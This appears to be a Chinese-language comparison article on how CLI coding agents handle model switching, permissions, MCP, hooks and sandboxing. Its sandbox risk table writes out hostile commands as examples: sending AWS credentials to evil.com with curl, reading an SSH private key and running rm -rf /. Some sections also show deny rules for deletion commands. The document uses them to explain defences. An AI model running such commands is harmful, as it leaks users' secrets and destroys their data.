# 基础设施命令对比：/hooks /sandbox /model /permissions /mcp

> 对比各 CLI Agent 的 5 类基础设施命令——模型切换、权限管理、MCP 集成、Hook 配置、沙箱隔离。这些命令不直接参与编码，但决定了工具的安全边界、扩展能力和运行环境。

---

## 一、/model（模型切换）

> 模型是 Agent 的"大脑"。各工具对模型管理的设计哲学差异巨大——从单槽位到三槽位，从封闭生态到全开放路由。

### 总览对比

| 工具 | 命令 | 槽位数 | 可选模型范围 | 运行时切换 | 多供应商 |
|------|------|--------|-------------|-----------|---------|
| **Claude Code** | `/model` | **1** | Sonnet / Opus / Haiku | ✓ | ✗（仅 Anthropic） |
| **Copilot CLI** | `/model` | **1** | 14+ 模型（Claude + GPT + Gemini + o 系列） | ✓ | ✓（模型乘数计费） |
| **Codex CLI** | `/model` | **1** | GPT-5 系列 + `--oss` 本地模型 | ✓ | ✓（OpenAI + 本地） |
| **Aider** | `/model` + `/editor-model` + `/weak-model` | **3** | 100+ 模型（litellm 代理层） | ✓ | ✓（任意 OpenAI 兼容 API） |
| **Gemini CLI** | `/model` | **1**（7 策略路由） | Flash / Pro 系列 | ✓（自动路由） | ✗（仅 Google） |
| **Qwen Code** | `/model` | **1** | 5 供应商：DashScope / DeepSeek / OpenRouter / ModelScope / OpenAI | ✓ | ✓ |
| **Kimi CLI** | `/model` | **1** | 多供应商 + thinking 模式切换 | ✓ | ✓ |

### Claude Code：单槽位极简设计

```
/model                    # 交互式选择模型
/model sonnet             # 直接切换到 Sonnet
/model opus               # 切换到 Opus（高级推理）
/model haiku              # 切换到 Haiku（快速轻量）
```

**设计哲学：** 封闭生态，三款模型覆盖不同场景——Haiku 用于快速任务、Sonnet 平衡日常、Opus 处理复杂推理。用户不需要理解模型参数，只需选择"速度/平衡/质量"三挡。

**局限：** 无法使用第三方模型。对于希望用 GPT 或 Gemini 的用户，这是硬限制。

### Copilot CLI：模型市场 + 乘数计费

```
/model                    # 列出所有可用模型
/model claude-sonnet-4    # 切换到 Claude Sonnet 4
/model o3                 # 切换到 OpenAI o3
/model gemini-2.5-pro     # 切换到 Gemini 2.5 Pro
```

**独有机制——模型乘数：** 不同模型消耗不同倍率的配额。基准为 GPT-4.1（1x），Claude Sonnet 4 为 1x，o3 为 1.5x，Gemini 2.5 Pro 为 0.5x。用户可以在配额内自由混搭。

**14+ 可选模型（截至 2026 年 3 月）：**
- OpenAI：GPT-4.1、GPT-4.1-mini、o3、o4-mini
- Anthropic：Claude Sonnet 4、Claude Haiku 3.5
- Google：Gemini 2.5 Pro、Gemini 2.5 Flash
- xAI：Grok 系列

**特点：** 单一工具内实现多家供应商的模型切换，对免费用户有月度请求限制，付费用户（Pro/Pro+）配额更高。

### Codex CLI：GPT-5 + 本地模型

```
/model                        # 切换模型
codex --model gpt-5           # 启动时指定 GPT-5
codex --model o4-mini          # 使用 o4-mini
codex --oss --model qwen3-coder  # 使用本地开源模型
```

**双轨架构：**
1. **云端轨道：** GPT-5 系列（`o3`、`o4-mini`、`gpt-5`），通过 OpenAI API 调用
2. **本地轨道：** `--oss` 标志启用本地模型推理，支持 Ollama/vLLM 后端，零成本运行

**`--oss` 模式的意义：** 这是主流 CLI Agent 中唯一原生集成本地模型推理的实现（Aider 通过 litellm 也可接本地模型，但非原生 flag）。适合离线环境、数据敏感场景、或想节省 API 费用的个人开发者。

### Aider：三槽位架构（独有）

```
/model claude-sonnet-4           # 切换主模型（代码生成、推理）
/editor-model gpt-4.1            # 切换编辑模型（文件编辑、diff 生成）
/weak-model gpt-4.1-mini         # 切换弱模型（提交消息、lint 修复等）
/models openai/                   # 搜索所有 OpenAI 兼容模型
```

**三槽位设计详解：**

| 槽位 | 命令 | 职责 | 推荐模型 | 成本影响 |
|------|------|------|---------|---------|
| **主模型** | `/model` | 代码生成、架构决策、复杂推理 | Claude Opus 4 / GPT-5 | 高（大量 token） |
| **编辑模型** | `/editor-model` | 将主模型的决策转化为精确的文件 diff | GPT-4.1 / Sonnet 4 | 中（聚焦编辑） |
| **弱模型** | `/weak-model` | 生成 commit 消息、运行 lint 修复等低价值任务 | GPT-4.1-mini / Haiku | 低（简单任务） |

**为什么三槽位有意义？** 不同任务对模型能力的需求差异巨大。用 Opus 4 生成 commit 消息是浪费，用 Haiku 做架构决策是冒险。三槽位让用户精确匹配"任务复杂度"与"模型能力"，在质量和成本间取得最优平衡。

**`/models` 搜索功能：** Aider 通过 litellm 代理层支持 100+ 模型，`/models <keyword>` 可搜索所有兼容模型并显示定价信息。

### Gemini CLI：7 策略模型路由

```
/model                    # 查看当前模型
/model flash              # 切换到 Flash（快速）
/model pro                # 切换到 Pro（强推理）
```

**自动路由机制：** Gemini CLI 的模型管理不只是切换——它有一个 7 策略路由器，根据任务类型自动选择最优模型：

```
策略 1: 简单问答 → Flash（低延迟）
策略 2: 代码生成 → Pro（强推理）
策略 3: 大文件分析 → Flash（大窗口）
策略 4: 多轮对话 → Pro（上下文理解）
策略 5: 工具调用 → Pro（工具使用能力强）
策略 6: 压缩任务 → 专用压缩模型
策略 7: 用户手动指定 → 遵循用户选择
```

**特点：** 用户无需关心选哪个模型，系统根据任务自动路由。但这也意味着用户对成本控制力较低。

### Qwen Code：5 供应商开放架构

```
/model                          # 切换模型
/model dashscope/qwen3-coder    # 使用 DashScope 的 Qwen3 Coder
/model deepseek/deepseek-r1     # 使用 DeepSeek R1
/model openrouter/claude-4      # 通过 OpenRouter 使用 Claude 4
/model modelscope/qwen3         # 使用 ModelScope
/model openai/gpt-5             # 使用 OpenAI GPT-5
```

**5 供应商统一接口：** Qwen Code 将 5 个不同的模型供应商抽象为统一的 `provider/model` 格式，用户只需一条命令即可在供应商间自由切换。

**配置方式：** 通过 `settings.json` 的 `providers` 字段配置 API Key 和 Base URL，支持自定义端点。

### Kimi CLI：多供应商 + 思考模式

```
/model                      # 列出可用模型
/model kimi-k2              # 切换到 Kimi K2
/model --thinking            # 切换思考模式（显示推理链）
/model --no-thinking         # 关闭思考模式
```

**thinking 模式切换：** Kimi CLI 独有的 thinking 模式开关，可在运行时切换是否显示模型的推理过程。开启后，模型会展示思维链（Chain of Thought），便于调试和理解决策。

### 关键发现

> **Aider 是唯一拥有 3 个独立模型槽位的工具。** 这种设计在成本优化和任务匹配上具有显著优势，但增加了配置复杂度。其他工具要么单槽位（Claude Code/Copilot/Codex），要么通过自动路由来解决任务匹配问题（Gemini CLI）。

---

## 二、/permissions（权限管理）

> 权限系统决定了 Agent 能做什么、不能做什么。设计不当可能导致数据泄露或文件损坏，过于严格则影响使用体验。

### 总览对比

| 工具 | 命令 | 规则类型 | 层级数 | 模式匹配 | 表达力 |
|------|------|---------|--------|---------|--------|
| **Claude Code** | `/permissions` | allow / ask / deny | **5 层** | 前缀匹配 `Bash(git:*)` | ★★★★☆ |
| **Gemini CLI** | `/permissions` + `/policies` | TOML 策略引擎 | **5 层** | 通配符 + 正则 | ★★★★★ |
| **Qwen Code** | `/permissions` | 继承 Gemini TOML 引擎 | **5 层** | 通配符 + 正则 | ★★★★★ |
| **Copilot CLI** | `/allow-all` + `/reset-allowed-tools` | 全局 + 工具级 | **2 层** | `--allow-tool` / `--deny-tool` | ★★★☆☆ |
| **Codex CLI** | `--ask-for-approval` | 4 模式 | **1 层** | 全局模式切换 | ★★☆☆☆ |
| **Kimi CLI** | `/yolo` | 开关式 | **1 层** | 全局开关 | ★☆☆☆☆ |
| **Aider** | — | 无权限系统 | **0** | — | — |

### Claude Code：5 层权限 + Prompt Hooks

```
/permissions                          # 查看当前权限规则
/permissions add allow Bash(git:*)    # 允许所有 git 开头的命令
/permissions add deny Bash(rm:*)      # 拒绝所有 rm 开头的命令
/permissions add ask Edit(src/**)     # 编辑 src 下文件时询问
```

**5 层优先级（从高到低）：**

```
系统设置（组织管理员配置）
  ↓ 覆盖
工作区设置（.claude/settings.json）
  ↓ 覆盖
用户设置（~/.claude/settings.json）
  ↓ 覆盖
项目设置（.claude/settings.local.json）
  ↓ 覆盖
会话默认值（交互中用户授权的临时规则）
```

**Prompt Hooks 的独特性：** Claude Code 的权限系统有一个其他工具完全不具备的维度——**Prompt Hooks 中的 prompt 类型 hook**。这类 hook 可以在工具调用前让 LLM 判断是否应该执行：

```json
{
  "hooks": {
    "PreToolUse": [{
      "type": "prompt",
      "prompt": "如果命令涉及删除生产数据库，返回 BLOCK。否则返回 PASS。"
    }]
  }
}
```

这意味着 Claude Code 的权限判断可以是**语义级**的——不只是模式匹配"命令包含 `rm`"，而是理解"这个操作的意图是删除生产数据"。这是规则引擎无法实现的。

### Gemini CLI：TOML 策略引擎

```
/permissions              # 查看当前权限状态
/policies                 # 查看所有策略配置
```

**TOML 策略文件示例（`~/.gemini/policies/security.toml`）：**

```toml
[[rules]]
description = "允许只读 Git 操作"
decision = "allow"
tool = "shell"
args_pattern = "^git (status|log|diff|branch)"

[[rules]]
description = "阻止删除命令"
decision = "deny"
tool = "shell"
args_pattern = "^(rm|rmdir|del)\\s"

[[rules]]
description = "敏感目录需要确认"
decision = "ask"
tool = "file_write"
path_pattern = "^/(etc|root|sys)/"
```

**5 层优先级（从高到低）：**

```
系统策略（/etc/gemini/policies/）
  ↓ 覆盖
内置策略（硬编码安全规则）
  ↓ 覆盖
项目策略（.gemini/policies/）
  ↓ 覆盖
用户策略（~/.gemini/policies/）
  ↓ 覆盖
会话运行时授权
```

**正则表达式的威力：** TOML 引擎支持完整的正则表达式匹配，可以写出极其精确的规则：

```toml
# 只允许在特定分支上执行 git push
args_pattern = "^git push origin (dev|staging)"

# 拒绝写入包含 secret/token/key 的文件名
path_pattern = "(?i)(secret|token|key|credential)"
```

### Copilot CLI：实用主义的两级权限

```
/allow-all                          # YOLO 模式——允许所有工具调用
/reset-allowed-tools                # 重置到默认权限
copilot-cli --allow-tool "gh:*"     # 启动时允许特定工具
copilot-cli --deny-tool "rm"        # 启动时拒绝特定工具
```

**设计理念：** Copilot CLI 认为大多数用户只需要两种状态——"每次都问我"或"全部允许"。`/allow-all` 一键切换到信任模式，`/reset-allowed-tools` 恢复安全模式。

**`--allow-tool` / `--deny-tool`：** 启动参数级别的精细控制，适合脚本化使用。但不支持运行时动态调整。

### Codex CLI：4 模式审批

```
codex --ask-for-approval untrusted    # 默认模式：每次都问
codex --ask-for-approval on-request   # 只在高风险操作时问
codex --ask-for-approval never        # YOLO 模式
codex --ask-for-approval granular     # 按工具类型分别设置
```

**4 模式详解：**

| 模式 | 文件读取 | 文件写入 | Shell 执行 | 网络访问 |
|------|---------|---------|-----------|---------|
| `untrusted` | ✓ | 问 | 问 | 问 |
| `on-request` | ✓ | ✓ | 问 | 问 |
| `never` | ✓ | ✓ | ✓ | ✓ |
| `granular` | 自定义 | 自定义 | 自定义 | 自定义 |

**特点：** 简洁但缺乏灵活性。无法针对特定命令或路径设置规则，只能按工具类别统一配置。

### Kimi CLI：极简开关

```
/yolo                # 切换 YOLO 模式（允许/禁止所有工具自动执行）
```

**只有一个开关：** 要么完全信任 Agent 自动执行所有操作，要么每次都弹出确认。没有中间状态，没有细粒度控制。适合快速原型开发，不适合生产环境。

### Aider：无权限系统

Aider 完全没有权限管理机制。所有文件编辑操作通过 `/add` 和 `/drop` 手动管理可编辑文件列表来间接控制。这意味着：

- 如果你 `/add` 了一个文件，Aider 可以自由修改它
- 如果你没有 `/add`，Aider 无法编辑（但可以读取）
- 没有 Shell 命令执行的权限控制（Aider 本身不直接执行 Shell）

### 关键发现

> **Gemini CLI 的 TOML 引擎是表达力最强的——支持正则、通配符、多层优先级。** 但 **Claude Code 的 Prompt Hooks 是最智能的——可以用 LLM 推理来判断是否允许操作**，这是规则引擎无法企及的语义理解能力。两者代表了权限管理的两个极端：规则驱动 vs 智能驱动。

---

## 三、/mcp（MCP 管理）

> MCP（Model Context Protocol）是 Agent 的"USB 接口"——标准化的工具扩展协议。各工具对 MCP 的支持深度差异巨大。

### 总览对比

| 工具 | 命令 | 传输协议 | 配置方式 | OAuth | 可作为 MCP Server | 内置 MCP 工具 |
|------|------|---------|---------|-------|-----------------|-------------|
| **Claude Code** | `/mcp` | stdio / SSE / streamable-http | `.mcp.json` | ✗ | ✗ | ✗ |
| **Copilot CLI** | `/mcp` | stdio / SSE | `mcp-config.json` | ✗ | ✗ | ✓（GitHub MCP） |
| **Codex CLI** | `codex mcp` 子命令族 | stdio | CLI 管理 | ✓ | **✓** | ✗ |
| **Gemini CLI** | `/mcp` | stdio / SSE | `settings.json` | ✓ | ✗ | ✗ |
| **Qwen Code** | `/mcp` | 继承 Gemini | `settings.json` | ✓ | ✗ | ✗ |
| **Kimi CLI** | `/mcp` + `kimi mcp` 子命令 | stdio / SSE | CLI + 配置文件 | ✓ | ✗ | ✗ |
| **Goose** | 配置驱动 | stdio / SSE | `config.yaml` | ✗ | ✗ | **全部工具** |
| **Aider** | — | — | — | — | — | — |

### Claude Code：3 传输协议 + 项目级配置

```
/mcp                      # 查看所有 MCP 服务器状态
```

**配置文件（`.mcp.json`）：**

```json
{
  "mcpServers": {
    "github": {
      "command": "npx",
      "args": ["@modelcontextprotocol/server-github"],
      "env": { "GITHUB_TOKEN": "..." }
    },
    "remote-api": {
      "url": "https://api.example.com/mcp",
      "transport": "streamable-http"
    },
    "legacy-sse": {
      "url": "https://old-api.example.com/sse",
      "transport": "sse"
    }
  }
}
```

**3 种传输协议：**
- **stdio**：本地进程，通过标准输入/输出通信（最常用）
- **SSE**：Server-Sent Events，远程服务器单向推送
- **streamable-http**：HTTP 流式传输，支持双向通信（最新协议）

**配置层级：** 项目级（`.mcp.json`）、用户级（`~/.claude/mcp.json`），项目级优先。

### Copilot CLI：内置 GitHub MCP

```
/mcp                          # 管理 MCP 服务器
/mcp add <server>             # 添加 MCP 服务器
/mcp remove <server>          # 移除 MCP 服务器
```

**内置 GitHub MCP Server：** Copilot CLI 预装了 GitHub MCP 服务器，无需任何配置即可使用 GitHub API——创建 Issue、管理 PR、查看 Actions、搜索代码等。这是其他工具都需要手动配置才能获得的能力。

**配置文件（`mcp-config.json`）：**

```json
{
  "servers": {
    "custom-db": {
      "command": "npx",
      "args": ["@mcp/postgres-server"],
      "env": { "DATABASE_URL": "..." }
    }
  }
}
```

### Codex CLI：最完整的 MCP CLI + 可作为 MCP Server

```
codex mcp list                    # 列出所有已配置的 MCP 服务器
codex mcp get <server>            # 查看服务器详情
codex mcp add <name> <command>    # 添加新的 MCP 服务器
codex mcp remove <name>           # 移除 MCP 服务器
codex mcp login <server>          # OAuth 登录远程 MCP 服务器
codex mcp logout <server>         # 注销 OAuth 会话
codex mcp-server                  # 将 Codex CLI 自身作为 MCP 服务器启动
```

**`codex mcp-server`——独有能力：** Codex CLI 是唯一可以将自身作为 MCP Server 暴露给其他工具的 CLI Agent。这意味着你可以：

```
# 在 Claude Code 中调用 Codex 作为工具
# .mcp.json
{
  "mcpServers": {
    "codex": {
      "command": "codex",
      "args": ["mcp-server"]
    }
  }
}
```

这开启了 Agent 套娃的可能——一个 Agent 通过 MCP 调用另一个 Agent。

**OAuth 支持：** `codex mcp login` 支持 OAuth 2.0 认证流程，可以连接需要认证的远程 MCP 服务器（如企业内部 API），无需在配置文件中明文存储 Token。

### Gemini CLI：OAuth + 运行时管理

```
/mcp                      # 列出所有 MCP 服务器及其工具
/mcp auth <server>        # 对远程 MCP 服务器进行 OAuth 认证
/mcp enable <server>      # 启用服务器
/mcp disable <server>     # 禁用服务器（不删除配置）
/mcp restart <server>     # 重启服务器进程
```

**运行时管理：** Gemini CLI 支持在会话中动态启用/禁用/重启 MCP 服务器，无需退出重启。当某个 MCP 服务器出现问题时，`/mcp restart` 比关掉整个会话重来要方便得多。

**OAuth 流程：** 对于需要认证的远程 MCP 服务器，`/mcp auth` 会打开浏览器完成 OAuth 流程，Token 自动保存到本地密钥链。

### Kimi CLI：最丰富的 CLI 管理命令

```
# 交互式命令
/mcp                          # 查看 MCP 状态

# CLI 子命令（非交互式）
kimi mcp add <name> <command>  # 添加 MCP 服务器
kimi mcp remove <name>         # 移除 MCP 服务器
kimi mcp auth <name>           # OAuth 认证
kimi mcp test <name>           # 测试 MCP 服务器连接
kimi mcp list                  # 列出所有服务器
```

**`kimi mcp test`——独有能力：** Kimi CLI 是唯一提供 MCP 服务器连接测试命令的工具。`kimi mcp test` 会验证服务器是否可达、协议是否正确、工具列表是否可获取，并报告详细的诊断信息。在调试 MCP 配置问题时非常有用。

**双入口设计：** 既有交互式的 `/mcp` 命令，又有非交互式的 `kimi mcp` CLI 子命令。前者适合在对话中管理，后者适合在脚本和 CI/CD 中自动化。

### Goose：MCP 原生架构

```
# Goose 没有 /mcp 命令——因为一切都是 MCP
# config.yaml
extensions:
  developer:
    type: builtin
  github:
    type: stdio
    command: npx
    args: ["@modelcontextprotocol/server-github"]
```

**设计理念：** Goose 的所有工具（包括内置的文件操作、Shell 执行）都是 MCP Server。没有"内置工具"和"MCP 扩展"的区分——统一的架构意味着添加新能力只需添加一个新的 MCP Server 配置。

**优势：** 极致的可扩展性。任何 MCP Server 和 Goose 内置工具地位平等。
**劣势：** 启动较慢（需要初始化所有 MCP Server 进程），调试较复杂。

### 关键发现

> **Codex CLI 是唯一可以将自身作为 MCP Server 的工具**——`codex mcp-server` 开启了 Agent 互调的新范式。而 **Goose 是唯一将所有内置工具都实现为 MCP 的工具**——架构最纯粹。Aider 完全不支持 MCP，是生态扩展能力最弱的。

---

## 四、/hooks（Hook 配置）

> Hooks 允许在 Agent 生命周期的关键节点插入自定义逻辑——执行前验证、执行后通知、错误处理等。

### 总览对比

| 工具 | 命令 | 事件数 | Hook 类型 | 运行时管理 | LLM 推理 Hook |
|------|------|--------|----------|-----------|-------------|
| **Claude Code** | `/hooks` | **22** | command / http / prompt | 仅查看 | **✓** |
| **Gemini CLI** | `/hooks` | **11** | command | 查看 / 启用 / 禁用 | ✗ |
| **其他工具** | — | 0 | — | — | — |

### Claude Code：22 事件 + 3 类型 Hook

```
/hooks                    # 查看所有已配置的 hooks
```

**22 个生命周期事件（部分列举）：**

```
PreToolUse          # 工具调用前（每次工具调用都触发）
PostToolUse         # 工具调用后（可处理结果）
Notification        # Agent 发出通知时
Stop                # Agent 停止运行时
SubagentStop        # 子代理停止时
PreCompact          # 上下文压缩前
PostCompact         # 上下文压缩后
```

**3 种 Hook 类型：**

**1. Command Hook（命令类型）：** 执行 Shell 命令

```json
{
  "hooks": {
    "PreToolUse": [{
      "type": "command",
      "command": "echo '工具调用: $TOOL_NAME' >> /tmp/agent.log"
    }]
  }
}
```

**2. HTTP Hook（网络类型）：** 发送 HTTP 请求

```json
{
  "hooks": {
    "PostToolUse": [{
      "type": "http",
      "url": "https://webhook.site/xxx",
      "method": "POST"
    }]
  }
}
```

**3. Prompt Hook（LLM 推理类型）——独有：**

```json
{
  "hooks": {
    "PreToolUse": [{
      "type": "prompt",
      "prompt": "分析即将执行的工具调用。如果涉及生产环境数据库的写操作，返回 BLOCK 并说明原因。否则返回 PASS。"
    }]
  }
}
```

**Prompt Hook 为什么是革命性的？** 传统 Hook 只能做模式匹配——"命令包含 `DROP TABLE` 则拒绝"。但 Prompt Hook 用 LLM 进行语义理解：

- 能识别"删除所有用户记录"这类不包含 `DROP TABLE` 关键词但意图相同的操作
- 能理解上下文——"在测试数据库上执行 DROP TABLE 是安全的"
- 能给出解释——不只是拒绝，还能说明为什么拒绝

**代价：** 每次触发 Prompt Hook 都会消耗一次 LLM 调用，增加延迟和成本。

### Gemini CLI：11 事件 + 运行时管理

```
/hooks                    # 查看所有 hooks 的状态
/hooks enable <name>      # 启用指定 hook
/hooks disable <name>     # 禁用指定 hook
```

**11 个生命周期事件：**

```
PreToolCall          # 工具调用前
PostToolCall         # 工具调用后
PreModelCall         # 模型调用前
PostModelCall        # 模型调用后
OnError              # 错误发生时
OnStart              # 会话启动时
OnEnd                # 会话结束时
PreCompression       # 压缩前
PostCompression      # 压缩后
PreFileWrite         # 文件写入前
PostFileWrite        # 文件写入后
```

**运行时管理优势：** Gemini CLI 支持在会话中动态启用/禁用 Hook，无需修改配置文件重启。这在调试 Hook 问题时非常实用——可以临时禁用有问题的 Hook 而不影响其他配置。

**配置方式（`settings.json`）：**

```json
{
  "hooks": {
    "PreToolCall": {
      "command": "python3 /scripts/validate_tool.py",
      "enabled": true,
      "timeout": 5000
    }
  }
}
```

### 其他工具：无 Hook 系统

| 工具 | 替代方案 |
|------|---------|
| **Copilot CLI** | 无 Hook 也无替代方案 |
| **Codex CLI** | 无 Hook，通过 `--ask-for-approval` 间接控制 |
| **Aider** | 无 Hook，通过 `.aider.conf.yml` 配置文件控制行为 |
| **Kimi CLI** | 无 Hook，通过 `/yolo` 开关控制 |
| **Goose** | 无 Hook，通过 MCP Server 间接扩展 |

### 关键发现

> **Claude Code 的 Prompt Hook 是所有 CLI Agent 中独一无二的创新**——用 LLM 推理替代规则匹配来做安全决策。Gemini CLI 的 Hook 系统虽然事件数较少（11 vs 22），但运行时管理能力（enable/disable）更实用。其他 5 个工具完全没有 Hook 系统。

---

## 五、Sandbox（沙箱隔离）

> 沙箱是 Agent 安全的最后一道防线——即使权限系统被绕过，沙箱也能限制 Agent 对系统的实际访问。

### 总览对比

| 工具 | macOS | Linux | Windows | 沙箱技术 | 深度 |
|------|-------|-------|---------|---------|------|
| **Codex CLI** | ✓ Seatbelt | ✓ Bubblewrap + Landlock + Seccomp | ✓ Restricted Tokens | 内核级 × 3 平台 | ★★★★★ |
| **Gemini CLI** | ✓ Seatbelt | ✓ seccomp BPF | ✓ C# 沙箱 | 内核级 × 3 平台 | ★★★★☆ |
| **Claude Code** | ✓ Seatbelt | ✓ Docker | ✗ | 内核级 + 容器 | ★★★☆☆ |
| **Copilot CLI** | ✗ | ✗ | ✗ | 无 | ☆☆☆☆☆ |
| **Aider** | ✗ | ✗ | ✗ | 无 | ☆☆☆☆☆ |
| **Kimi CLI** | ✗ | ✗ | ✗ | 无 | ☆☆☆☆☆ |
| **Goose** | ✗ | ✗ | ✗ | 无 | ☆☆☆☆☆ |

### Codex CLI：最全面的跨平台沙箱

**macOS：Seatbelt（sandbox-exec）**

```
sandbox-exec 配置要点：
- 拒绝所有网络访问（默认）
- 只允许读写工作目录及 /tmp
- 拒绝访问 ~/.ssh、~/.aws 等敏感目录
- 允许读取系统库和工具链
```

**Linux：三层防御纵深**

```
第 1 层：Bubblewrap（用户命名空间隔离）
  - 创建隔离的文件系统视图
  - 只挂载必要的目录（/usr、/lib、工作目录）
  - 隐藏 /home 下其他用户目录

第 2 层：Landlock（LSM 文件访问控制）
  - 限制可访问的文件路径集合
  - 即使进程逃逸 Bubblewrap 也无法读写受限路径
  - Linux 5.13+ 内核支持

第 3 层：Seccomp（系统调用过滤）
  - 白名单制——只允许已知安全的系统调用
  - 拒绝 ptrace、mount、reboot 等危险系统调用
  - BPF 程序在内核态执行，无法绕过
```

**Windows：Restricted Tokens**

```
- 创建受限令牌（Restricted Token）运行子进程
- 移除管理员权限
- 限制文件系统访问范围
- 使用 Windows Job Objects 控制资源
```

**三平台统一的安全模型：** 无论在哪个平台，Codex CLI 都保证：
1. **网络隔离**：默认禁止所有出站网络（可选开启）
2. **文件系统隔离**：只能访问工作目录和临时目录
3. **进程隔离**：无法与宿主机上其他进程交互

### Gemini CLI：三平台内核级沙箱

**macOS：Seatbelt**

与 Codex CLI 类似的 sandbox-exec 配置，但 Gemini CLI 的 Seatbelt 配置文件包含约 200+ 条规则，精细控制每类系统调用的权限。

**Linux：seccomp BPF**

```
Gemini CLI 的 seccomp 实现特点：
- 编译为 BPF 字节码，内核态执行
- 白名单约 80 个系统调用（覆盖日常开发所需）
- 拒绝 clone3、unshare 等可能逃逸的调用
- 违规时返回 EPERM 而非 SIGKILL（更优雅的失败处理）
```

**Windows：C# 沙箱包装器**

Gemini CLI 用 C# 编写了一个 Windows 专用的沙箱包装器，利用 .NET 的安全模型限制进程权限。这是一个非常规的技术选择——大多数 Node.js/TypeScript 项目不会引入 C# 依赖。

**与 Codex CLI 的差异：**
- Codex CLI 在 Linux 上用了 3 层防御（Bubblewrap + Landlock + Seccomp），Gemini CLI 只用了 1 层（seccomp）
- Codex CLI 的 Linux 沙箱包含文件系统命名空间隔离，Gemini CLI 没有
- Gemini CLI 的 Windows 方案更成熟（C# 原生集成 vs Restricted Tokens）

### Claude Code：Seatbelt + Docker

**macOS：Seatbelt**

```
与 Codex/Gemini 类似的 sandbox-exec 配置：
- 限制文件系统访问
- 限制网络访问
- 限制进程间通信
```

**Linux：Docker 容器**

```
Claude Code 在 Linux 上不使用内核级沙箱，而是依赖 Docker：
- 在 Docker 容器内运行所有工具调用
- 容器有独立的文件系统和网络栈
- 通过卷挂载共享工作目录

优势：隔离更彻底（完整的容器隔离）
劣势：需要安装 Docker，启动开销更大
```

**Windows：不支持沙箱**

Claude Code 在 Windows 上没有沙箱实现。建议 Windows 用户通过 WSL2 使用 Docker 方案。

### 其他工具：无沙箱

**Copilot CLI、Aider、Kimi CLI、Goose** 均没有沙箱机制。这意味着：

- Agent 执行的命令拥有与用户相同的系统权限
- 恶意的工具调用可以访问整个文件系统
- 可以发起任意网络请求
- 可以读取 SSH 密钥、环境变量中的 Token 等敏感信息

**风险等级评估：**

| 场景 | 有沙箱 | 无沙箱 |
|------|--------|--------|
| Agent 执行 `cat ~/.ssh/id_rsa` | 被拒绝 | **泄露 SSH 私钥** |
| Agent 执行 `curl https://evil.com -d @~/.aws/credentials` | 网络被阻断 | **AWS 凭证泄露** |
| Agent 执行 `rm -rf /` | 文件系统隔离保护 | **系统被破坏**（需 root 权限） |
| Agent 执行 `pip install malicious-package` | 网络被阻断或限制安装路径 | **供应链攻击** |

### 关键发现

> **Codex CLI 拥有最全面的跨平台沙箱**——三平台均有内核级隔离，Linux 上更是三层防御纵深（Bubblewrap + Landlock + Seccomp）。Gemini CLI 次之，覆盖三平台但 Linux 层数较少。Claude Code 的 Docker 方案在 Linux 上隔离最彻底但开销最大。**其余 4 个工具完全没有沙箱——这在生产环境中是严重的安全隐患。**

---

## 六、综合对比总表

| 维度 | Claude Code | Copilot CLI | Codex CLI | Aider | Gemini CLI | Qwen Code | Kimi CLI | Goose |
|------|-------------|-------------|-----------|-------|------------|-----------|---------|-------|
| **模型切换** | 单槽/3 模型 | 单槽/14+ 模型 | 单槽+本地 | **3 槽/100+** | 单槽/自动路由 | 单槽/5 供应商 | 单槽+thinking | 配置驱动 |
| **权限管理** | 5 层+Prompt Hook | 2 层 | 4 模式 | **无** | **5 层 TOML** | 5 层 TOML | 开关式 | 无 |
| **MCP 集成** | 3 传输协议 | 内置 GitHub | **可作 Server** | **无** | OAuth+运行时 | 继承 Gemini | CLI 管理 | MCP 原生 |
| **Hook 系统** | **22 事件/3 类型** | 无 | 无 | 无 | 11 事件 | 继承 Gemini | 无 | 无 |
| **沙箱隔离** | macOS+Docker | 无 | **3 平台/3 层** | 无 | 3 平台 | 无 | 无 | 无 |

### 各工具在基础设施维度的最强项

| 工具 | 最强维度 | 原因 |
|------|---------|------|
| **Claude Code** | Hook 系统 | 22 事件 + Prompt Hook（LLM 推理）独一无二 |
| **Copilot CLI** | 模型切换 | 14+ 多供应商模型 + 乘数计费最灵活 |
| **Codex CLI** | 沙箱隔离 | 3 平台 × 内核级 × 三层纵深防御最安全 |
| **Aider** | 模型管理 | 3 槽位 × 100+ 模型 × 成本优化最精细 |
| **Gemini CLI** | 权限管理 | TOML 正则引擎 + 5 层优先级表达力最强 |
| **Qwen Code** | 多供应商 | 5 供应商统一接口 + 继承 Gemini 权限/Hook |
| **Kimi CLI** | MCP CLI 管理 | `kimi mcp test` 连接测试独有 |
| **Goose** | MCP 架构 | 全工具 MCP 原生，架构最纯粹 |

### 安全综合评分

```
Codex CLI     ████████████████████ 20/20 （沙箱+权限+审批）
Gemini CLI    █████████████████░░░ 17/20 （沙箱+TOML 权限+Hook）
Claude Code   ████████████████░░░░ 16/20 （沙箱+5 层权限+Prompt Hook）
Qwen Code     ██████████████░░░░░░ 14/20 （继承 Gemini 权限+Hook，无沙箱）
Copilot CLI   ████████░░░░░░░░░░░░ 8/20  （基础权限，无沙箱）
Kimi CLI      ██████░░░░░░░░░░░░░░ 6/20  （仅 YOLO 开关）
Goose         █████░░░░░░░░░░░░░░░ 5/20  （MCP 原生但无沙箱无权限）
Aider         ████░░░░░░░░░░░░░░░░ 4/20  （无权限无沙箱无 Hook）
```

### 最终结论

1. **安全基础设施差距巨大：** Codex CLI/Gemini CLI/Claude Code 形成安全第一梯队（有沙箱+有权限+有 Hook），其余工具在安全维度明显落后
2. **模型管理百花齐放：** 从单槽极简（Claude Code）到三槽精细（Aider）到自动路由（Gemini），各有设计哲学
3. **MCP 正在成为标准：** 8 个工具中 7 个支持 MCP（仅 Aider 除外），但深度差异显著——Goose 全量 MCP 原生，Codex 可作 Server，其他仅作 Client
4. **Hook 是下一个竞争前沿：** 目前仅 Claude Code 和 Gemini CLI 有 Hook 系统，但 Prompt Hook（LLM 推理决策）代表了未来方向——从规则驱动到智能驱动的范式转移